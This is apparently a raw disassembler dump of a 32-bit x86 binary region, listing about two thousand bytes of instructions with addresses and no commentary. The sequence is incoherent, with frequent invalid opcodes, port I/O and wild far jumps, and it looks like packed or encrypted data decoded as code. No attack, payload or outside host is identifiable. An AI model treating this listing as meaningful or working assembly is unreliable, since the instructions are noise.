  408df8:	repz xchg ebp,edi
  408dfb:	add    al,0x28
  408dfd:	pop    ds
  408dfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408dff:	repz fcmovne st,st(3)
  408e02:	mov    bl,0xd9
  408e04:	test   DWORD PTR [ebx],ebp
  408e06:	mov    eax,0x557f00ee
  408e0b:	or     ch,cl
  408e0d:	or     dl,dh
  408e0f:	jl     0x408db9
  408e11:	(bad)  
  408e12:	sub    eax,0x369df8ac
  408e17:	cdq    
  408e18:	div    BYTE PTR [ecx]
  408e1a:	or     edx,DWORD PTR [eax+0x7ef31de7]
  408e20:	mov    bh,0x3d
  408e22:	mov    bl,0xe4
  408e24:	out    dx,al
  408e25:	pop    edx
  408e26:	xchg   ebx,eax
  408e27:	or     BYTE PTR [ecx-0x717f5406],bl
  408e2d:	cld    
  408e2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e2f:	jns    0x408e8d
  408e31:	sbb    al,0x93
  408e33:	add    BYTE PTR [eax],0xf3
  408e36:	fisttp QWORD PTR [eax-0x52]
  408e39:	push   es
  408e3a:	popa   
  408e3b:	push   edx
  408e3c:	repnz call 0xa796:0xaf45237e
  408e44:	push   es
  408e45:	cmp    eax,0x2195d62d
  408e4a:	addr16 xchg edx,eax
  408e4c:	mov    ebx,0xcd893fd1
  408e51:	push   esi
  408e52:	pusha  
  408e53:	ss dec ecx
  408e55:	fsub   DWORD PTR [ebx+ecx*2+0x6a]
  408e59:	inc    esp
  408e5a:	lods   eax,DWORD PTR ds:[esi]
  408e5b:	push   cs
  408e5c:	sbb    eax,0xe53362e2
  408e61:	sub    eax,0x7a46afa3
  408e66:	mov    bl,0x67
  408e68:	into   
  408e69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e6a:	mov    bl,0xdf
  408e6c:	pop    es
  408e6d:	pop    edx
  408e6e:	stc    
  408e6f:	fwait
  408e70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e71:	out    0x93,al
  408e73:	test   eax,0x5780645c
  408e78:	inc    edx
  408e79:	out    dx,eax
  408e7a:	fistp  QWORD PTR [ecx-0x61]
  408e7d:	dec    edi
  408e7e:	out    0xdd,eax
  408e80:	cmc    
  408e81:	or     al,0xb9
  408e83:	outs   dx,DWORD PTR ds:[esi]
  408e84:	mov    esi,0x27c8bf7
  408e89:	fs retf 
  408e8b:	bnd jmp 0x408e14
  408e8e:	nop
  408e8f:	lea    ebp,[edi+0x17]
  408e92:	aam    0xa9
  408e94:	stos   BYTE PTR es:[edi],al
  408e95:	cmp    al,0x86
  408e97:	or     DWORD PTR [eax],ebx
  408e99:	imul   ebp,ebx,0x78
  408e9c:	sbb    eax,edi
  408e9e:	dec    esi
  408e9f:	(bad)  
  408ea0:	in     al,0x66
  408ea2:	fnstsw WORD PTR [edx+0x5c17e1b5]
  408ea8:	(bad)  [eax+0x5b287641]
  408eae:	cmp    eax,DWORD PTR [eax]
  408eb0:	mov    eax,0x8dc0a760
  408eb5:	imul   edi,edx,0x446e6f72
  408ebb:	mov    esi,0x33852de9
  408ec0:	mov    edi,0xe34fff78
  408ec5:	adc    al,0x31
  408ec7:	pop    ecx
  408ec8:	xchg   edx,eax
  408ec9:	mov    esi,0x9f4cf4fb
  408ece:	or     ah,BYTE PTR [esi]
  408ed0:	js     0x408ef5
  408ed2:	mov    esp,0xd8f9accb
  408ed7:	aam    0xe2
  408ed9:	and    DWORD PTR fs:[eax+0x53],eax
  408edd:	mov    al,ds:0x98a8acb9
  408ee2:	outs   dx,BYTE PTR ds:[esi]
  408ee3:	shl    bh,0x9f
  408ee6:	ins    DWORD PTR es:[edi],dx
  408ee7:	sub    BYTE PTR [ebx+0x7290a5c7],dh
  408eed:	fist   DWORD PTR [esi]
  408eef:	(bad)  [edi+0x5a]
  408ef2:	mov    eax,0x62281903
  408ef7:	ret    0x3cb6
  408efa:	cs ss std 
  408efd:	call   FWORD PTR [esi-0x8]
  408f00:	and    ebp,esp
  408f02:	inc    ecx
  408f03:	pop    ss
  408f04:	fsub   st(7),st
  408f06:	fcomp  DWORD PTR [edx+0x446a6775]
  408f0c:	jb     0x408eab
  408f0e:	(bad)  
  408f0f:	jp     0x408ea9
  408f11:	xor    DWORD PTR [edx+0x3075b86e],esi
  408f17:	rol    DWORD PTR [edi*8+0x63632435],1
  408f1e:	and    al,0xef
  408f20:	add    bl,ch
  408f22:	mov    eax,0x9bf250aa
  408f27:	mov    bl,0xda
  408f29:	add    ecx,DWORD PTR [ecx+edx*1]
  408f2c:	mov    ebx,0xd3d4899e
  408f31:	mov    esi,DWORD PTR [esi-0x455a688c]
  408f37:	pop    ss
  408f38:	add    eax,0x9d245b3a
  408f3d:	ins    BYTE PTR es:[edi],dx
  408f3e:	cmc    
  408f3f:	nop
  408f40:	(bad)  
  408f42:	test   eax,0xba9568e3
  408f47:	ffreep st(5)
  408f49:	push   0xb0771242
  408f4e:	dec    ebp
  408f4f:	daa    
  408f50:	int3   
  408f51:	cmp    ah,BYTE PTR [ebx]
  408f53:	es addr16 int3 
  408f56:	out    dx,al
  408f57:	lds    esp,FWORD PTR [eax]
  408f59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f5a:	push   ebp
  408f5b:	sub    bh,dh
  408f5d:	test   eax,0xf3691c73
  408f62:	sbb    ah,BYTE PTR [ebx+eiz*4-0x3c54e236]
  408f69:	mov    edx,0x78bc3bbc
  408f6e:	cli    
  408f6f:	enter  0xbf58,0x9b
  408f73:	mov    ebx,0xc29cb070
  408f78:	or     al,0x8b
  408f7a:	cmp    BYTE PTR [ebx-0x7f],dh
  408f7d:	add    DWORD PTR [edx+eax*2+0x33],edx
  408f81:	aad    0x6f
  408f83:	outs   dx,DWORD PTR ds:[esi]
  408f84:	cli    
  408f85:	mov    eax,ds:0x5d1bc8a8
  408f8a:	push   ds
  408f8b:	fs dec edx
  408f8d:	out    dx,eax
  408f8e:	mov    es,WORD PTR ds:0xa32988b1
  408f94:	pop    es
  408f95:	jne    0x408f4d
  408f97:	adc    bh,bh
  408f99:	out    dx,al
  408f9a:	sub    ah,BYTE PTR [eax]
  408f9c:	(bad)  
  408f9d:	fadd   DWORD PTR [ebx+0x13]
  408fa0:	mov    dh,0xbb
  408fa2:	loopne 0x408f3e
  408fa4:	or     ecx,ebx
  408fa6:	test   BYTE PTR [esi],dh
  408fa8:	pop    esp
  408fa9:	mov    ch,0xe9
  408fab:	retf   
  408fac:	ds into 
  408fae:	je     0x408f87
  408fb0:	das    
  408fb1:	mov    esi,fs
  408fb3:	dec    edx
  408fb4:	xchg   ecx,eax
  408fb5:	stos   DWORD PTR es:[edi],eax
  408fb6:	int3   
  408fb7:	int3   
  408fb8:	stc    
  408fb9:	retf   0x6aec
  408fbc:	addr16 lock jo 0x40900f
  408fc0:	loop   0x408fb7
  408fc2:	mov    bl,0x92
  408fc4:	cmp    al,0xe4
  408fc6:	(bad)  
  408fc8:	test   al,0xf5
  408fca:	xchg   ebp,eax
  408fcc:	fidivr DWORD PTR [edx]
  408fce:	scas   eax,DWORD PTR es:[edi]
  408fcf:	dec    esp
  408fd0:	sbb    BYTE PTR [edi],ch
  408fd2:	es int 0xb3
  408fd5:	fsub   DWORD PTR [esi+0x4a]
  408fd8:	daa    
  408fd9:	or     DWORD PTR [esi],ebx
  408fdb:	loopne 0x409007
  408fdd:	mov    WORD PTR [esi],gs
  408fdf:	or     bh,al
  408fe1:	adc    BYTE PTR [ebx-0x5dae1118],0x58
  408fe8:	and    DWORD PTR [edx+0x23],0x74
  408fec:	or     edi,DWORD PTR [esi-0x2f23237d]
  408ff2:	les    esi,FWORD PTR [eax+0x671a9cc9]
  408ff8:	sbb    al,0x9a
  408ffa:	hlt    
  408ffb:	pushf  
  408ffc:	icebp  
  408ffd:	jecxz  0x409074
  408fff:	dec    esp
  409000:	hlt    
  409001:	xchg   ecx,eax
  409002:	imul   ebx,DWORD PTR ds:0xb3b32f66,0x66fc48b1
  40900c:	pusha  
  40900d:	jmp    0x2ba07edf
  409012:	xchg   ecx,eax
  409013:	cmp    eax,0xf9132ae3
  409018:	xlat   BYTE PTR ds:[ebx]
  409019:	rol    cl,0x90
  40901c:	cmp    BYTE PTR [eax+0x3cfd34bc],bh
  409022:	cmp    esp,DWORD PTR [esp+edx*2-0x16]
  409026:	shr    DWORD PTR [ecx-0x17b7b30b],cl
  40902c:	test   BYTE PTR [ecx+ebp*4],cl
  40902f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409030:	call   0x8759b281
  409035:	and    bl,ah
  409037:	or     ebx,DWORD PTR fs:[eax]
  40903a:	mov    edx,0x4213b496
  40903f:	xor    al,0x5b
  409041:	sbb    bh,BYTE PTR [edx+0x4006b5f2]
  409047:	dec    esi
  409048:	into   
  409049:	lock xor DWORD PTR [ecx-0x40],esp
  40904d:	push   edi
  40904e:	dec    esi
  40904f:	xchg   edx,eax
  409050:	inc    ecx
  409051:	xchg   DWORD PTR [esi+0x6dd3907a],ecx
  409057:	adc    edi,ebx
  409059:	mov    al,0xe1
  40905b:	cld    
  40905c:	fimul  DWORD PTR [ebx]
  40905e:	and    ebx,esi
  409060:	inc    esi
  409061:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409062:	and    eax,0xa7c29fe3
  409067:	jp     0x409089
  409069:	add    eax,0x691a636b
  40906e:	jo     0x409028
  409070:	push   0x42
  409072:	push   ebx
  409073:	shl    DWORD PTR [ebp-0x4a115222],cl
  409079:	(bad)  
  40907a:	push   ss
  40907b:	cmp    eax,0x51724caf
  409080:	ja     0x4090a2
  409082:	xor    dh,BYTE PTR [ecx-0xf67f53d]
  409088:	and    ch,dl
  40908a:	scas   eax,DWORD PTR es:[edi]
  40908b:	fs xor ebx,ecx
  40908e:	xchg   edi,eax
  40908f:	mov    edx,0xaa97737f
  409094:	adc    dh,BYTE PTR [esi]
  409096:	sar    DWORD PTR [edi-0x645e8fb1],0x53
  40909d:	outs   dx,DWORD PTR ds:[esi]
  40909e:	jl     0x409076
  4090a0:	leave  
  4090a1:	push   0xffffffaa
  4090a3:	or     eax,0xa8e8e20f
  4090a8:	pop    DWORD PTR [esi]
  4090aa:	push   0xffffffc3
  4090ac:	cmp    DWORD PTR [ecx+0xc4a9bdb],ebp
  4090b2:	shr    BYTE PTR [ecx],cl
  4090b4:	pand   mm1,QWORD PTR [esp+edi*1]
  4090b8:	jg     0x40907a
  4090ba:	xlat   BYTE PTR ds:[ebx]
  4090bb:	(bad)  
  4090bc:	fadd   DWORD PTR [ebx+eax*2+0x1f60adfc]
  4090c3:	jl     0x40910a
  4090c5:	adc    al,0x52
  4090c7:	shl    BYTE PTR [esi],1
  4090c9:	cld    
  4090ca:	mov    ds:0xde4ebedf,eax
  4090cf:	fld    DWORD PTR ds:[edx]
  4090d2:	rcl    BYTE PTR [edi-0x3c034fed],0x4e
  4090d9:	jp     0x409158
  4090db:	aam    0xc8
  4090dd:	xlat   BYTE PTR ds:[ebx]
  4090de:	enter  0xbb94,0x32
  4090e2:	test   DWORD PTR [ebp+0x69],0x8ed3e1ae
  4090e9:	cmp    al,0x85
  4090eb:	cmp    ebx,DWORD PTR [edi]
  4090ed:	push   ecx
  4090ee:	adc    BYTE PTR ds:0x5fa3f0d2,dh
  4090f4:	outs   dx,BYTE PTR ds:[esi]
  4090f5:	pop    ds
  4090f6:	pop    edi
  4090f7:	and    ebp,edx
  4090f9:	sti    
  4090fa:	inc    ebx
  4090fb:	sub    edi,DWORD PTR [edx+0x71]
  4090fe:	arpl   WORD PTR [ebx+0x5b6a0603],si
  409104:	push   es
  409105:	sar    DWORD PTR [ebx+esi*4+0x119068b9],cl
  40910c:	inc    ebp
  40910d:	iret   
  40910e:	dec    edx
  40910f:	mov    BYTE PTR [edx-0x64],ah
  409112:	adc    ebp,DWORD PTR [edi]
  409114:	adc    al,0x2f
  409116:	fistp  WORD PTR [ebx]
  409118:	jb     0x40917b
  40911a:	ret    0x8877
  40911d:	sbb    ebx,ecx
  40911f:	out    0x7c,al
  409121:	cld    
  409122:	xor    BYTE PTR [esi+ebx*1+0x2e8ea7ab],cl
  409129:	pop    edx
  40912a:	xor    eax,0xc8b19a01
  40912f:	dec    ecx
  409130:	addr16 cwde 
  409132:	lock or edi,DWORD PTR [edx-0x44]
  409136:	mov    ebx,0xd2d9b0da
  40913b:	jns    0x40914d
  40913d:	and    eax,0xe8e0d1
  409142:	retf   0x9210
  409145:	adc    eax,0xdc302030
  40914a:	pushf  
  40914b:	mov    esi,0xad696bc1
  409150:	jb     0x409165
  409152:	ins    BYTE PTR es:[edi],dx
  409153:	out    0x99,eax
  409155:	hlt    
  409156:	in     eax,dx
  409157:	or     ah,bh
  409159:	rcr    al,cl
  40915b:	(bad)  
  40915c:	std    
  40915d:	push   ecx
  40915e:	jle    0x4091da
  409160:	jae    0x40912b
  409162:	jo     0x4091ca
  409164:	push   esp
  409165:	sub    al,0x3d
  409167:	rol    BYTE PTR [ebp+0x2e],1
  40916a:	popf   
  40916b:	add    dh,BYTE PTR [edx-0x7]
  40916e:	int    0xa1
  409170:	jo     0x4091ce
  409172:	inc    esi
  409173:	inc    esp
  409174:	and    eax,0xd2f7dc94
  409179:	mov    ebp,0xafa67956
  40917e:	inc    eax
  40917f:	fst    QWORD PTR [ecx-0x68]
  409182:	std    
  409183:	push   edx
  409184:	mov    gs,WORD PTR [edi-0x7f]
  409187:	dec    ecx
  409188:	inc    ebp
  409189:	fnstcw WORD PTR [ebx+0x44a2132e]
  40918f:	and    eax,0x95c7fa25
  409194:	fstp   DWORD PTR [ecx]
  409196:	jo     0x4091c6
  409198:	das    
  409199:	sub    al,0x65
  40919b:	not    DWORD PTR [ebx+0x5d]
  40919e:	loope  0x409158
  4091a0:	mov    ebp,0x4ac8497d
  4091a5:	cmp    BYTE PTR [ecx+ebx*8+0x4371d70d],0x19
  4091ad:	lock je 0x409216
  4091b0:	mov    dh,BYTE PTR [esi-0x19]
  4091b3:	mov    edi,0x3b7106b6
  4091b8:	mul    BYTE PTR [ecx+edx*2]
  4091bb:	hlt    
  4091bc:	stc    
  4091bd:	(bad)  
  4091be:	sub    cl,BYTE PTR [edi+0x43589ece]
  4091c4:	data16 (bad) 
  4091c6:	dec    edx
  4091c7:	out    dx,eax
  4091c8:	mov    cl,0x3
  4091ca:	pushf  
  4091cb:	dec    edx
  4091cc:	sub    DWORD PTR [esi-0x10],esi
  4091cf:	mov    ds:0xd96a93ce,eax
  4091d4:	dec    ebx
  4091d5:	mov    ds:0x9e67e007,al
  4091da:	sar    BYTE PTR [edi],cl
  4091dc:	jbe    0x409162
  4091de:	test   eax,0x5e63cbdd
  4091e3:	out    0xb,al
  4091e5:	jnp    0x4091de
  4091e7:	pop    ds
  4091e8:	cld    
  4091e9:	cmp    eax,0x40e86ffd
  4091ee:	test   DWORD PTR [eax],0x1183f1ce
  4091f4:	mov    WORD PTR [eax],ss
  4091f6:	js     0x40926a
  4091f8:	and    ecx,edi
  4091fa:	pop    ecx
  4091fb:	adc    eax,0x24d2a1a2
  409200:	fs jo  0x4091a7
  409203:	repnz arpl WORD PTR [edi-0x6f62620a],di
  40920a:	stos   DWORD PTR es:[edi],eax
  40920b:	cmp    DWORD PTR [edx+eax*2-0x12],0x5a09ce0b
  409213:	std    
  409214:	mov    dh,0x4a
  409216:	inc    ebx
  409217:	test   al,0xe7
  409219:	in     al,0x8
  40921b:	bound  edx,QWORD PTR [ebx-0x566e05f4]
  409221:	mov    esi,0x5b8c548e
  409226:	(bad)  
  409227:	(bad)  
  409228:	mov    eax,ds:0x776eb8c9
  40922d:	cmc    
  40922e:	jmp    0x4091d0
  409230:	mul    al
  409232:	lds    esi,FWORD PTR [ebx+0x58]
  409235:	lock (bad) 
  409237:	lods   al,BYTE PTR ds:[esi]
  409238:	scas   eax,DWORD PTR es:[edi]
  409239:	fldenv [edx+0x5d]
  40923c:	retf   0x937d
  40923f:	sub    al,0x11
  409241:	mov    ecx,0xfbd4b89a
  409246:	out    0x5b,al
  409248:	or     eax,0xe98f7a35
  40924d:	sti    
  40924e:	push   edx
  40924f:	ins    BYTE PTR es:[edi],dx
  409250:	daa    
  409251:	jno    0x409292
  409253:	mov    edx,0xce1c5a1e
  409258:	jge    0x40926f
  40925a:	sub    eax,0xe736fee4
  40925f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409260:	call   0xdec3feec
  409265:	cld    
  409266:	fs xchg ebx,eax
  409268:	jp     0x40924e
  40926a:	pop    eax
  40926b:	push   edx
  40926c:	mov    edx,0x5712ed3d
  409271:	inc    esp
  409272:	icebp  
  409273:	test   ch,bl
  409275:	(bad)  
  409276:	sbb    al,BYTE PTR [eax+0x6e7cac50]
  40927c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40927d:	xor    edi,ecx
  40927f:	or     edi,eax
  409281:	sti    
  409282:	mov    eax,ds:0xba6198de
  409287:	jge    0x4092a4
  409289:	jg     0x40928c
  40928b:	and    DWORD PTR [ecx-0xe],esp
  40928e:	iret   
  40928f:	mov    es,WORD PTR [eax-0x20]
  409292:	cmp    ecx,DWORD PTR [ecx+0x73]
  409295:	or     eax,0xc3ee577
  40929a:	arpl   WORD PTR [edi],sp
  40929c:	std    
  40929d:	rcl    BYTE PTR [edi],0x1b
  4092a0:	ins    DWORD PTR es:[edi],dx
  4092a1:	arpl   WORD PTR [esi+0x36f606e6],bx
  4092a7:	fidivr DWORD PTR [ecx+esi*8-0x37074445]
  4092ae:	mov    ecx,0x4731714c
  4092b3:	jl     0x4092e2
  4092b5:	std    
  4092b6:	icebp  
  4092b7:	leave  
  4092b8:	mov    ecx,0x92fa3362
  4092bd:	cmp    dh,BYTE PTR [esi+eiz*8+0x2d]
  4092c1:	(bad)  
  4092c2:	into   
  4092c3:	fs xchg ebx,eax
  4092c5:	int    0xbd
  4092c7:	dec    esp
  4092c8:	add    eax,0xf207aea3
  4092cd:	js     0x409280
  4092cf:	mov    cl,0x47
  4092d1:	repz cmc 
  4092d3:	push   eax
  4092d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092d5:	pop    ebp
  4092d6:	push   es
  4092d7:	sub    ebx,edx
  4092d9:	in     eax,dx
  4092da:	jge    0x409356
  4092dc:	mov    dl,0xcb
  4092de:	inc    ebx
  4092df:	das    
  4092e0:	gs jo  0x409299
  4092e3:	add    BYTE PTR [edx],0x37
  4092e6:	mov    eax,0xa4b4a982
  4092eb:	stos   DWORD PTR es:[edi],eax
  4092ec:	adc    bl,BYTE PTR [eax+0x1a]
  4092ef:	inc    edi
  4092f0:	cmp    bl,bh
  4092f2:	inc    esp
  4092f3:	(bad)  [ebp+0x596be819]
  4092f9:	xor    esi,edx
  4092fb:	mov    dl,dl
  4092fd:	in     al,dx
  4092fe:	clc    
  4092ff:	cwde   
  409300:	sub    DWORD PTR [edi+0x218496e6],0x5b
  409307:	jmp    0xbec1:0x26fe6fe
  40930e:	lds    esp,FWORD PTR [edi]
  409310:	cmp    dh,BYTE PTR [edi]
  409312:	jge    0x4092bc
  409314:	pusha  
  409315:	pop    ss
  409316:	rcr    BYTE PTR [ebp+0x4ba81e1d],0x81
  40931d:	and    ebx,ebx
  40931f:	sub    eax,0xce66f065
  409324:	call   0xb38c40aa
  409329:	mov    esp,0xebb05920
  40932f:	loopne 0x4092c5
  409331:	or     DWORD PTR ds:0x7433fce0,esp
  409337:	add    al,0xa7
  409339:	dec    esi
  40933a:	les    esp,FWORD PTR [ecx+ebx*1+0x436865e7]
  409341:	cmp    al,0x8
  409343:	arpl   cx,cx
  409345:	mov    BYTE PTR [ebx-0x39775bbf],cl
  40934b:	dec    ecx
  40934c:	adc    al,0xbb
  40934e:	add    DWORD PTR [edx],0xffffff95
  409351:	fsubr  QWORD PTR [ebx+0x5]
  409354:	out    dx,al
  409355:	lods   eax,DWORD PTR ds:[esi]
  409356:	inc    eax
  409357:	xor    DWORD PTR [ebx+eax*1],ebx
  40935a:	gs (bad) 
  40935c:	pop    edx
  40935d:	mov    ebx,0x1c3002b7
  409362:	imul   esp,esi,0xeace4123
  409368:	int3   
  409369:	dec    ebp
  40936a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40936b:	push   eax
  40936c:	stos   DWORD PTR es:[edi],eax
  40936d:	sub    ecx,esp
  40936f:	rcl    DWORD PTR [eax+0x752414f2],cl
  409375:	xchg   ebx,eax
  409376:	in     eax,0xcf
  409378:	and    BYTE PTR [edi-0x1c820957],al
  40937e:	mov    dl,0xf0
  409380:	retf   0xd314
  409383:	adc    al,0x28
  409385:	cs (bad) 
  409387:	ja     0x4093dc
  409389:	das    
  40938a:	imul   esp,DWORD PTR [ecx],0x70f06a53
  409390:	aam    0xe2
  409392:	(bad)  
  409394:	inc    ecx
  409395:	jno    0x409414
  409397:	jbe    0x4093fb
  409399:	int3   
  40939a:	cmp    dl,BYTE PTR [ecx+0x6fef03d5]
  4093a0:	pop    eax
  4093a1:	ja     0x4093ac
  4093a3:	xor    DWORD PTR [ecx],ecx
  4093a5:	jl     0x40936e
  4093a7:	mov    al,ds:0x80f188d
  4093ac:	in     al,dx
  4093ad:	jge    0x409381
  4093af:	push   esi
  4093b0:	inc    ecx
  4093b1:	and    al,0x9
  4093b3:	mov    ebp,es
  4093b5:	(bad)  
  4093b6:	mov    bl,0xfc
  4093b8:	jge    0x40938b
  4093ba:	sub    bh,bl
  4093bc:	pusha  
  4093bd:	shl    DWORD PTR ds:0x22979349,1
  4093c3:	sub    al,dh
  4093c5:	jmp    0x409349
  4093c7:	loop   0x409353
  4093c9:	jg     0x409384
  4093cb:	outs   dx,DWORD PTR ds:[esi]
  4093cc:	mov    al,0x6c
  4093ce:	mov    edx,0xda7b14ea
  4093d3:	or     DWORD PTR [edi+edx*8-0x5effc6e],0xff0fc3f3
  4093de:	fwait
  4093df:	bound  esp,QWORD PTR [ebx]
  4093e1:	in     al,0x1a
  4093e3:	add    eax,0xfb5b6db3
  4093e8:	jnp    0x409400
  4093ea:	fld    QWORD PTR [edx+0x310719b0]
  4093f0:	neg    DWORD PTR [ebx+0x10d7f47c]
  4093f6:	popf   
  4093f7:	or     ecx,ebp
  4093f9:	iret   
  4093fa:	je     0x409387
  4093fc:	xor    BYTE PTR [ebx+0x1b],dh
  4093ff:	xor    eax,0x9563ac4
  409404:	call   0xe55599bf
  409409:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40940a:	push   es
  40940b:	xchg   esi,eax
  40940c:	sbb    ah,cl
  40940e:	cmp    DWORD PTR [edx],eax
  409410:	daa    
  409411:	mov    ebp,0x12fb7542
  409416:	mov    esi,DWORD PTR [esi-0x19a947b7]
  40941c:	jb     0x409477
  40941e:	adc    eax,0x6f2ae8c1
  409424:	dec    ebx
  409425:	push   esi
  409426:	inc    ebx
  409427:	rol    BYTE PTR [eax],cl
  409429:	test   BYTE PTR [esi],bl
  40942b:	push   esp
  40942c:	loopne 0x409459
  40942e:	addr16 pop ss
  409430:	mov    ecx,0xaabfddfa
  409435:	push   0x16
  409437:	push   ss
  409438:	push   cs
  409439:	fld    DWORD PTR [ebp+0x10]
  40943c:	cmp    cl,ah
  40943e:	call   0xfdf1:0xa45d3387
  409445:	retf   
  409446:	ret    
  409447:	(bad)  
  409448:	xor    DWORD PTR [ebp+0x27],ecx
  40944b:	mov    ah,0x58
  40944d:	xchg   ecx,eax
  40944e:	sbb    bl,BYTE PTR [ebx+0x73621452]
  409454:	jmp    0x60c7c26f
  409459:	sbb    BYTE PTR [edx],al
  40945b:	test   BYTE PTR [ebx],al
  40945d:	and    eax,0x1c3ecad
  409462:	or     DWORD PTR [edx+edi*4],esp
  409465:	xchg   edx,eax
  409466:	rol    DWORD PTR [edi+0x6e90e60b],1
  40946c:	ror    DWORD PTR [edx+0x72874b9d],0x5e
  409473:	out    dx,eax
  409474:	adc    BYTE PTR [ebx-0x461b38f5],ch
  40947a:	push   cs
  40947b:	or     eax,0x2dd09e6
  409480:	xlat   BYTE PTR ds:[ebx]
  409481:	adc    ebp,eax
  409483:	xchg   ebp,eax
  409484:	ret    
  409485:	add    bh,BYTE PTR [ebp+edx*1+0x5d]
  409489:	sbb    DWORD PTR [esi-0xf7f881],0xffffff8e
  409490:	pop    ecx
  409491:	or     cl,BYTE PTR ds:0xe00552c5
  409497:	in     eax,0x1d
  409499:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40949a:	xor    al,0x16
  40949c:	push   ebp
  40949d:	cmc    
  40949e:	push   esp
  40949f:	jo     0x4094fd
  4094a1:	mov    cl,0xbd
  4094a3:	cdq    
  4094a4:	push   es
  4094a5:	jl     0x409502
  4094a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094a8:	loope  0x409484
  4094aa:	stc    
  4094ab:	rol    DWORD PTR [ecx+0x72],1
  4094ae:	mov    eax,0x9aa1f0b8
  4094b3:	cmp    esi,DWORD PTR [edi+ebx*8-0x3752fc3c]
  4094ba:	and    ecx,ecx
  4094bc:	sbb    eax,0x51cc4e7d
  4094c1:	js     0x4094b3
  4094c3:	lods   al,BYTE PTR ds:[esi]
  4094c4:	in     eax,dx
  4094c5:	and    BYTE PTR [ebx],bh
  4094c7:	mov    cl,0x76
  4094c9:	or     DWORD PTR [ecx+0x26b95f35],0x4ffce6e
  4094d3:	adc    esi,esp
  4094d5:	outs   dx,DWORD PTR ds:[esi]
  4094d6:	jp     0x4094bd
  4094d8:	and    eax,0xcd2b6988
  4094dd:	adc    DWORD PTR [ebx+0x6b],eax
  4094e0:	rol    DWORD PTR [ecx],0x98
  4094e3:	add    al,0xc5
  4094e5:	xchg   DWORD PTR [ebp-0x3d2985ba],esp
  4094eb:	aam    0xe4
  4094ed:	mov    esp,0xbec231b6
  4094f2:	mov    al,0xf
  4094f4:	call   DWORD PTR [edx]
  4094f6:	push   es
  4094f7:	mov    cl,0xd0
  4094f9:	sub    eax,0xacf2d07c
  4094fe:	ficom  DWORD PTR [eax-0x50930719]
  409504:	mov    dl,0xa3
  409506:	fist   DWORD PTR [ebx-0x6fe81c06]
  40950c:	or     eax,DWORD PTR [ebp+edi*4+0x153bef4e]
  409513:	mov    edx,0x3191cc54
  409518:	pop    es
  409519:	jecxz  0x409505
  40951b:	call   0xa0e7:0x4af6cf59
  409522:	pop    es
  409523:	jo     0x409567
  409525:	xchg   edi,eax
  409526:	xor    bh,ah
  409528:	data16 je 0x409500
  40952b:	cmp    DWORD PTR [edx],edx
  40952d:	push   es
  40952e:	imul   BYTE PTR [eax+0x67514889]
  409534:	or     BYTE PTR [edx+0x606d6899],bh
  40953a:	pop    edi
  40953b:	dec    eax
  40953c:	rol    DWORD PTR [esi-0x1e447005],1
  409542:	pop    eax
  409543:	xor    BYTE PTR [ebp-0x18],al
  409546:	push   esi
  409547:	paddusb mm0,QWORD PTR [eax-0x469901e5]
  40954e:	adc    BYTE PTR [edi-0x13],al
  409551:	adc    cl,BYTE PTR [ebp-0x47f9465e]
  409557:	leave  
  409558:	in     eax,dx
  409559:	aas    
  40955a:	add    al,0xc3
  40955c:	adc    ecx,DWORD PTR [ecx+0x43c8bd6e]
  409562:	cli    
  409563:	(bad)  
  409564:	aas    
  409565:	cmp    BYTE PTR [esi-0x11],dl
  409568:	mov    ah,BYTE PTR [ebp+ecx*1+0x37]
  40956c:	jns    0x40955f
  40956e:	scas   eax,DWORD PTR es:[edi]
  40956f:	sbb    al,0x88
  409571:	xor    al,BYTE PTR [esi+edx*8]
  409574:	popa   
  409575:	iret   
  409576:	push   ds
  409577:	fnsetpm(287 only) 
  409579:	dec    edi
  40957a:	pop    ebx
  40957b:	mov    ebp,0xe022cb77
  409580:	mov    esp,0x30ff937e
  409585:	sbb    eax,0x85806832
  40958a:	js     0x4095e2
  40958c:	(bad)  
  40958d:	ss adc eax,0x65eaffe9
  409593:	lods   al,BYTE PTR ds:[esi]
  409594:	and    edi,eax
  409596:	out    dx,eax
  409597:	and    dh,BYTE PTR [esi]
  409599:	add    ebx,DWORD PTR [edi]
  40959b:	ja     0x4095cc
  40959d:	retf   0x7e9e
  4095a0:	sub    DWORD PTR [eax-0x7b75331b],edi
  4095a6:	ins    DWORD PTR es:[edi],dx
  4095a7:	mov    cl,0x88
  4095a9:	ins    DWORD PTR es:[edi],dx
  4095aa:	dec    ebx
  4095ab:	cmp    eax,0xfa156bd7
  4095b0:	mov    es,WORD PTR [ebp-0x18]
  4095b3:	std    
  4095b4:	pop    edx
  4095b5:	or     al,0xb7
  4095b7:	or     bh,BYTE PTR [edi+0x1b3cb31e]
  4095bd:	mov    cl,0xc2
  4095bf:	pop    esp
  4095c0:	out    0x3c,eax
  4095c2:	pop    edi
  4095c3:	imul   esp,ebp,0x10f0cc93
  4095c9:	mov    bh,0xdb
  4095cb:	cmp    BYTE PTR [edx-0x72],al
  4095ce:	dec    ecx
  4095cf:	scas   eax,DWORD PTR es:[edi]
  4095d0:	scas   al,BYTE PTR es:[edi]
  4095d1:	arpl   WORD PTR [ecx],di
  4095d3:	dec    esi
  4095d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095d5:	jmp    0x65b37a0a
  4095da:	mov    ecx,0xf013b0dd
  4095df:	out    0x21,eax
  4095e1:	aas    
  4095e2:	loope  0x409632
  4095e4:	ds jecxz 0x40956a
  4095e7:	mov    edx,0x87501f81
  4095ec:	outs   dx,BYTE PTR ds:[esi]
  4095ed:	je     0x409607
  4095ef:	xchg   dh,cl
  4095f1:	dec    ebp
  4095f2:	xchg   DWORD PTR [eax+0x56],esi
  4095f5:	push   ebx
  4095f6:	mov    bl,0x47
